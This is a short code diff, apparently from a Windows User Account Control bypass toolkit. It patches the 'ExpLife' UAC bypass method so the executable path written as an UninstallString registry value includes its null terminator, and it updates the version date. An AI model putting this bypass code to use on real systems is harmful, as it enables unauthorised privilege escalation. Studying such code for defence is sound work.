@@ -6,7 +6,7 @@
 *
 *  VERSION:     2.70
 *
-*  DATE:        25 Mar 2017
+*  DATE:        01 May 2017
 *
 *  ExpLife UAC bypass using IARPUninstallStringLauncher.
 *  For description please visit original URL
@@ -86,6 +86,7 @@ BOOL ucmUninstallLauncherMethod(
 )
 {
     BOOL        bResult = FALSE, bCond = FALSE;
+    SIZE_T      cbData;
     HKEY        hKey = NULL;
     LRESULT     lResult;
     GUID        guid;
@@ -109,8 +110,9 @@ BOOL ucmUninstallLauncherMethod(
             if (lResult != ERROR_SUCCESS)
                 break;
 
+            cbData = (1 + _strlen(lpszExecutable)) * sizeof(WCHAR);
             lResult = RegSetValueEx(hKey, L"UninstallString", 0, REG_SZ, (BYTE*)lpszExecutable,
-                (DWORD)(_strlen(lpszExecutable) * sizeof(WCHAR)));
+                (DWORD)cbData);
 
             if (lResult != ERROR_SUCCESS)
                 break;
